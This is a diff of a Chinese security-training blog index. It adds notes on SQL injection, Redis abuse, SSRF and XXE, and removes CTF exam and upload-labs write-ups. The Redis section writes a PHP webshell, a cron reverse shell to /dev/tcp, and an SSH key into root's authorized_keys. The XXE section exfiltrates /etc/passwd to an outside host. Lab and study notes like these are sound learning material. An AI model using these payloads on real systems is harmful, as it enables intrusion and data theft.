@@ -69,6 +69,86 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SqlInject" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/13/SqlInject/" class="article-date">
+  <time class="dt-published" datetime="2025-01-13T15:13:40.000Z" itemprop="datePublished">2025-01-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/13/SqlInject/">SqlInject</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="概述">概述</span></h2><h3><span id="产生原因">产生原因</span></h3><p>开发者未严格过滤用户传入的参数，导致恶意sql语句拼接到了sql语句中。</p>
+<h3><span id="影响">影响</span></h3><p>拖库</p>
+<p>修改数据库数据</p>
+<p>获取网站控制权</p>
+<h3><span id="分类">分类</span></h3><p>根据利用方式划分</p>
+<p>联合查询注入</p>
+<p>报错注入</p>
+<p>布尔盲注</p>
+<p>时间盲注</p>
+<p>根据sql语句类型分</p>
+<p>select型(最常见)</p>
+<p>update型</p>
+<p>insert型</p>
+<p>delete型</p>
+<p>特殊注入方式</p>
+<p>宽字节注入</p>
+<p>二次编码注入</p>
+<p>二阶注入</p>
+<p>堆叠注入</p>
+<h2><span id="挖掘">挖掘</span></h2><h3><span id="黑盒">黑盒</span></h3><p>手动一般测试方法：</p>
+<p>实现网站正常功能</p>
+<p>测试闭合符号</p>
+<p>寻找回显位</p>
+<p>获取信息</p>
+<h3><span id="白盒">白盒</span></h3><p>php重点函数<code>mysqli_query</code></p>
+<p>观察执行sql语句的位置是否存在不安全拼接</p>
+<h2><span id="攻防">攻防</span></h2><h3><span id="利用">利用</span></h3><p>mysql中获取数据库信息</p>
+<p>mysql写shell</p>
+<p>日志</p>
+<p>INTO OUTFILE</p>
+<h3><span id="防御">防御</span></h3><p>PDO预处理</p>
+<p>最小化数据库权限</p>
+<p>站库分离</p>
+<h3><span id="绕过防御">绕过防御</span></h3><p>各种编码</p>
+<h2><span id="其他">其他</span></h2><h3><span id="工具">工具</span></h3><p>[[sqlmap]]</p>
+<h3><span id="靶场">靶场</span></h3><p>[[sqli-labs]]</p>
+<h3><span id="文章">文章</span></h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/13/SqlInject/" data-id="cm5vste4n0006friwauwkhkqf" data-title="SqlInject" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SqlInject/" rel="tag">SqlInject</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-CVE-2016-4437" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/13/CVE-2016-4437/" class="article-date">
@@ -146,7 +226,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/13/CVE-2016-4437/" data-id="cm5v5kurf0002ftiwhl746f6q" data-title="CVE-2016-4437" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/13/CVE-2016-4437/" data-id="cm5vste4g0001friw7sk46a9j" data-title="CVE-2016-4437" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -188,7 +268,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/11/Sec-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" data-id="cm5v5kuri0004ftiwe3xce0y8" data-title="Sec-Linux常用命令" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/11/Sec-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" data-id="cm5vste4k0003friwhsmlg5x4" data-title="Sec-Linux常用命令" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -291,7 +371,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/10/week9_kls_exam/" data-id="cm5v5kus4001kftiw3npv4i3x" data-title="week9_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/10/week9_kls_exam/" data-id="cm5vste5y006pfriwek1oggyi" data-title="week9_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -364,7 +444,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/03/week8_kls_exam/" data-id="cm5v5kus4001jftiwdwt61j70" data-title="week8_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/03/week8_kls_exam/" data-id="cm5vste5y006ofriw8mjx874v" data-title="week8_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -490,7 +570,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/30/ssrf-vuls/" data-id="cm5v5kurp000bftiwcvegdsmg" data-title="ssrf-vuls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/30/ssrf-vuls/" data-id="cm5vste5d002hfriw20l43jme" data-title="ssrf-vuls" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -563,10 +643,78 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/27/week7_kls_exam/" data-id="cm5v5kurz000vftiw2upqgyuw" data-title="week7_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/27/week7_kls_exam/" data-id="cm5vste5h002yfriw5usz8fdq" data-title="week7_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-day34_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/26/day34_kls/" class="article-date">
+  <time class="dt-published" datetime="2024-12-26T15:05:22.000Z" itemprop="datePublished">2024-12-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/12/26/day34_kls/">day34_kls</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="课程内容">课程内容</span></h2><h3><span id="redis">redis</span></h3><p>写webshell</p>
+<p>利用持久化存储写webshell<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /var/www/html</span><br><span class="line">CONFIG SET dbfilename shell.php</span><br><span class="line">SET test &quot;&lt;!--?php system($_GET[&#x27;cmd&#x27;]); ?--&gt;&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></p>
+<p>写计划任务</p>
+<p>利用条件</p>
+<p>目标机器为centos系列</p>
+<p>cetnos系列cron会略过错误的行</p>
+<p>原理与写webshell相同<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /var/spool/cron/</span><br><span class="line">CONFIG SET dbfilename root</span><br><span class="line">set test &quot;\n\n\n * * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.183/9999 0&gt;&amp;1  \n\n\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></p>
+<p>写ssh public key</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /root/.ssh/</span><br><span class="line">CONFIG SET dbfilename authorized_keys</span><br><span class="line">set test &quot;\n\n\n your_key\n\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure>
+
+<h3><span id="ssrf">ssrf</span></h3><h4><span id="原因">原因</span></h4><p>开发者未对用户可控的url进行限制，导致服务器请求到恶意的url</p>
+<h4><span id="危害">危害</span></h4><p>内网探测</p>
+<p>信息泄漏</p>
+<h4><span id="挖掘">挖掘</span></h4><p>白盒</p>
+<p>是否存在用户可控的服务器访问url</p>
+<p>黑盒</p>
+<p>参数中存在url就可劲干</p>
+<p>验证是否存在漏洞</p>
+<p>http</p>
+<p>dnslog</p>
+<h4><span id="利用">利用</span></h4><p>文件读取</p>
+<p><code>file:///path/to/file</code></p>
+<p>端口探测</p>
+<p><code>dict://host:ip</code></p>
+<h4><span id="防御">防御</span></h4><p>过滤恶意协议</p>
+<p>禁止访问内网ip</p>
+<h4><span id="绕过防御">绕过防御</span></h4><p>对于127.0.0.1</p>
+<p>使用127.1.1.1等类似ip绕过</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/26/day34_kls/" data-id="cm5vste56001rfriw87wz7kiv" data-title="day34_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
+
     </footer>
   </div>
   
@@ -685,7 +833,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/26/sqli-labs/" data-id="cm5v5kurl0007ftiw10af6ha7" data-title="sqli-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/26/sqli-labs/" data-id="cm5vste5b002efriw7ghyfb9a" data-title="sqli-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -699,16 +847,12 @@
 
 
   
-    <article id="post-week6_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-day33_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/20/week6_kls_exam/" class="article-date">
-  <time class="dt-published" datetime="2024-12-20T06:10:36.000Z" itemprop="datePublished">2024-12-20</time>
+    <a href="/2024/12/25/day33_kls/" class="article-date">
+  <time class="dt-published" datetime="2024-12-25T14:58:44.000Z" itemprop="datePublished">2024-12-25</time>
 </a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/exam/">exam</a>
-  </div>
-
   </div>
   <div class="article-inner">
     
@@ -717,7 +861,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/20/week6_kls_exam/">week6_kls_exam</a>
+      <a class="p-name article-title" href="/2024/12/25/day33_kls/">day33_kls</a>
     </h1>
   
 
@@ -725,228 +869,40 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="题目1">题目1</span></h2><p>注册账号上去瞅瞅，能上传文件，让俺试一试</p>
-<p><img src="/../assets/image_1734673092865_0.png" alt="image.png"></p>
-<p>俺传上去了一个php，直接getshell</p>
-<p>连接webshell</p>
-<p><img src="/../assets/image_1734673165002_0.png" alt="image.png"></p>
-<p>flag大大方方的在这里啦</p>
-<p><img src="/../assets/image_1734673202146_0.png" alt="image.png"></p>
-<p><code>flag&#123;40fef70e713fe9fc934667c18ca7a434&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
-<h2><span id="题目2">题目2</span></h2><p>没有提示，没有框，先扫一下</p>
-<p><img src="/../assets/image_1734673380819_0.png" alt="image.png"></p>
-<p>phpmyadmin，没有弱密码，登陆不进去</p>
-<p>有网站备份，下载下来看看</p>
-<p><img src="/../assets/image_1734673419179_0.png" alt="image.png"></p>
-<p>有好东西<code>index.php</code></p>
-<p><img src="/../assets/image_1734673515308_0.png" alt="image.png"></p>
-<p>有密码</p>
-<p><img src="/../assets/image_1734673486038_0.png" alt="image.png"></p>
-<p>phpmyadmin启动</p>
-<p><img src="/../assets/image_1734673628482_0.png" alt="image.png"></p>
-<p><code>flag&#123;88de7c430e8984299b0a0f850440b9e2&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
-<h2><span id="题目3">题目3</span></h2><p>看了看f12</p>
-<p><img src="/../assets/image_1734673703486_0.png" alt="image.png"></p>
-<p>让俺信息收集，那就来吧，直接开扫</p>
-<p><img src="/../assets/image_1734673881532_0.png" alt="image.png"></p>
-<p>这upload页面还藏起来了，直接传马，啥校验也没有，直接干</p>
-<p><img src="/../assets/image_1734674066120_0.png" alt="image.png"></p>
-<p>连webshell</p>
-<p><img src="/../assets/image_1734674019652_0.png" alt="image.png"></p>
-<p>让我康康</p>
-<p><img src="/../assets/image_1734674092799_0.png" alt="image.png"></p>
-<p><code>flag&#123;174344ef316b9d58b6917ca468b7e04c&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
-<h2><span id="题目4">题目4</span></h2><p>小手一抖登陆进去了，有sql注入，开始梭哈</p>
-<p><img src="/../assets/image_1734674370233_0.png" alt="image.png"></p>
-<p>timu4</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.2.214:10003</span><br><span class="line">Content-Length: 41</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.2.214:10003</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.2.214:10003/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=f29dcd6a3675ac3e9cd11d88a3550bed</span><br><span class="line">Connection: keep-alive</span><br><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure>
+        <h2><span id="课程内容">课程内容</span></h2><h3><span id="xxe">xxe</span></h3><h4><span id="原因">原因</span></h4><p>服务器开启了外部实体加载，xml解析器解析了恶意的外部实体，导致读取恶意文件，访问恶意地址</p>
+<h4><span id="预备知识点">预备知识点</span></h4><p>DTD</p>
+<p>文档类型定义</p>
+<p>document type define</p>
+<p>用于约束文档</p>
+<p>一个简单的DTD</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ENTITY author &quot;John Doe&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ENTITY author_external SYSTEM &quot;file:///etc/passwd&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 参数实体 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ENTITY % name &quot;to&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用参数实体 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ELEMENT note (%name; from, heading, body)--&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line">Tove</span><br><span class="line"><span class="comment">&lt;!-- 调用实体 --&gt;</span></span><br><span class="line"><span class="symbol">&amp;author;</span></span><br><span class="line">Reminder</span><br><span class="line">Don&#x27;t forget me this weekend!</span><br></pre></td></tr></table></figure>
 
-<p><code>--os-shell</code>一把梭</p>
-<p><img src="/../assets/image_1734674746011_0.png" alt="image.png"></p>
-<p>获取flag</p>
-<p><img src="/../assets/image_1734674684673_0.png" alt="image.png"></p>
-<p><code>flag&#123;8caecc0d7209b1e97c8c0b0c6891992c&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
+<h4><span id="危害">危害</span></h4><p>敏感文件读取</p>
+<p>ddos</p>
+<p>ssrf</p>
+<h4><span id="挖掘">挖掘</span></h4><p>黑盒</p>
+<p>content-type为xml，传入xml</p>
+<p>白盒</p>
+<p>解析了用户传入的xml</p>
+<p>开启了外部实体解析</p>
+<h4><span id="利用">利用</span></h4><p>文件包含</p>
+<p>远程文件内容<br>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">&lt;!--ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;--&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--ENTITY % b &quot;&lt;!ENTITY % c SYSTEM &#x27;http://192.168.2.183:8888/?f=%a;&#x27;--&gt;</span>&quot;&gt;</span><br><span class="line">  %b;</span><br><span class="line">  %c;</span><br><span class="line">				  ``` xml</span><br><span class="line"></span><br><span class="line">包含</span><br><span class="line">  ``` xml</span><br><span class="line">  %d;</span><br><span class="line">  ]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>命令执行</p>
+<p><code>expect://cmd</code></p>
+<p>ddos</p>
+<p>循环调用</p>
+<h4><span id="防御">防御</span></h4><p>不允许外部实体</p>
+<p>过滤伪协议</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/20/week6_kls_exam/" data-id="cm5v5kurx000qftiw0ulq08mb" data-title="week6_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/25/day33_kls/" data-id="cm5vste57001tfriw98u53ela" data-title="day33_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-    </footer>
-  </div>
-  
-</article>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li></ul>
 
-
-
-  
-    <article id="post-upload-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/20/upload-labs/" class="article-date">
-  <time class="dt-published" datetime="2024-12-19T16:28:13.000Z" itemprop="datePublished">2024-12-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/range/">range</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/20/upload-labs/">upload-labs</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="搭建">搭建</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">去gayhub下载，精简包</span><br></pre></td></tr></table></figure>
-
-<h2><span id="过关">过关</span></h2><h3><span id="关卡1">关卡1</span></h3><p>没什么好说的，js校验，栓条狗都能</p>
-<h3><span id="关卡2">关卡2</span></h3><p>MIME类型绕过，bp抓包，一抓一个准</p>
-<h3><span id="关卡3">关卡3</span></h3><p>未严格校验，传<code>phtml</code></p>
-<h3><span id="关卡4">关卡4</span></h3><p>中间件是apache,我们上传<code>.htaccess</code>和<code>shell.png</code>让apache解析png</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sethandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
-
-<h3><span id="关卡5-9">关卡5-9</span></h3><p>待定，后面写</p>
-<h3><span id="关卡10">关卡10</span></h3><p>垃圾的双写</p>
-<h3><span id="关卡11-12">关卡11-12</span></h3><p>00截断，错误的php配置，会将<code>00(ASCII)</code>认为是文件的结束。</p>
-<p>当上传文件带路径时，php会将<code>abc/a.php%00photo.png</code>认为是<code>abc/a.php</code></p>
-<h3><span id="关卡13-16">关卡13-16</span></h3><p>图片马，前提是存在文件解析漏洞，或文件包含漏洞，通过这些漏洞将图片解析为php</p>
-<p>生成图片马</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pic.png shell.php &gt; webshell.png</span><br></pre></td></tr></table></figure>
-
-<p>压缩的图片马</p>
-<p>这个生成俺不会</p>
-<h3><span id="关卡17">关卡17</span></h3><p>条件竞争，校验逻辑错误的将文件临时存储起来时，这时我们碰巧访问到该文件，则会执行</p>
-<p>便捷的请求方式</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while true; do</span><br><span class="line">	curl xxx</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注意，不要将curl放到后台运行，会卡，如果非要，那么建议指定次数</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/20/upload-labs/" data-id="cm5v5kurq000dftiw1l276g05" data-title="upload-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-week5_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/13/week5_kls_exam/" class="article-date">
-  <time class="dt-published" datetime="2024-12-13T06:14:52.000Z" itemprop="datePublished">2024-12-13</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/exam/">exam</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/13/week5_kls_exam/">week5_kls_exam</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="题目1">题目1</span></h2><p>题目提示了，mysql密码中有好东西。但是俺不，抓个登陆包，啥也不看，闭眼一把梭</p>
-<p>呜呜呜，梭哈失败了，但是俺使用目录扫描扫到了一些奇怪的东西。</p>
-<p><img src="/../assets/image_1734069840124_0.png" alt="image.png"></p>
-<p>有gayhub泄漏，使用githack恢复一下</p>
-<p><img src="/../assets/image_1734069889796_0.png" alt="image.png"></p>
-<p>从git中恢复出了<code>configuration.php</code><br>      id:: 675bce82-733f-481c-9194-f306dd066aab</p>
-<p><img src="/../assets/image_1734069943322_0.png" alt="image.png"></p>
-<p>password中有flag</p>
-<p><code>flag&#123;9c233764285d9a7ef4a10b8b7daa7e7b&#125;</code></p>
-<h2><span id="题目1解法2">题目1解法2</span></h2><p>本题不像是手写的，应该是框架(确信</p>
-<p>康康是用啥写的</p>
-<p><img src="/../assets/image_1734075558545_0.png" alt="image.png"></p>
-<p>very good</p>
-<p>整个扫描器扫扫。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">GitHub OWASP&#x2F;joomscan: OWASP Joomla Vulnerability Scanner Project https://www.secologist.com/</a></p>
-<p><img src="/../assets/image_1734075601889_0.png" alt="image.png"></p>
-<p>没多少信息，不过能够看到版本号</p>
-<p>一番搜索</p>
-<p>该版本存在信息泄漏，能整出来数据库密码。auv，这不巧了吗。数据库密码里有好东西。正好有exp,让俺运行一下</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Acceis/exploit-CVE-2023-23752">GitHub Acceis&#x2F;exploit-CVE-2023-23752: Joomla! &lt; 4.2.8 Unauthenticated information disclosure</a></p>
-<p><img src="/../assets/image_1734075989390_0.png" alt="image.png"></p>
-<h2><span id="题目2">题目2</span></h2><p>题目让俺一把梭，俺抓个搜索包，开始梭哈。</p>
-<p>啥也不看，闭眼一把梭</p>
-<p><img src="/../assets/image_1734070227412_0.png" alt="image.png"></p>
-<p>timu2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.2.214:10001</span><br><span class="line">Content-Length: 13</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.2.214:10001</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.2.214:10001/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: 0350c45adcb555161a8b854c66b9ecff=104f9d1c7c5f921e0bc2588d85c27b1f</span><br><span class="line">Connection: keep-alive</span><br><span class="line">student_id=12</span><br></pre></td></tr></table></figure>
-
-<p>第一次梭哈</p>
-<p><img src="/../assets/image_1734068181398_0.png" alt="image.png"></p>
-<p>获得flag</p>
-<p><code>flag&#123;c056164f914401826083b48d17a9a675&#125;</code></p>
-<h2><span id="题目3">题目3</span></h2><p>什么，你有sql注入，还有这好事？！抓个搜索包，开始梭哈。</p>
-<p>啥也不看，闭眼一把梭</p>
-<p><img src="/../assets/image_1734068498217_0.png" alt="image.png"></p>
-<p>timu3</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?search=12 HTTP/1.1</span><br><span class="line">Host: 192.168.2.214:10002</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.2.214:10002/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: 0350c45adcb555161a8b854c66b9ecff=104f9d1c7c5f921e0bc2588d85c27b1f</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-
-<p>第一次梭哈，第二次梭哈</p>
-<p><img src="/../assets/image_1734068533862_0.png" alt="image.png"></p>
-<p>flag</p>
-<p><code>flag&#123;c056164f914401826083b48d17a9a675&#125;</code></p>
-<h2><span id="题目4">题目4</span></h2><p>有限制的sql注入？！，抓个登陆包，开始梭哈</p>
-<p>啥也不看，闭眼一把梭</p>
-<p><img src="/../assets/image_1734068859179_0.png" alt="image.png"></p>
-<p>timu4</p>
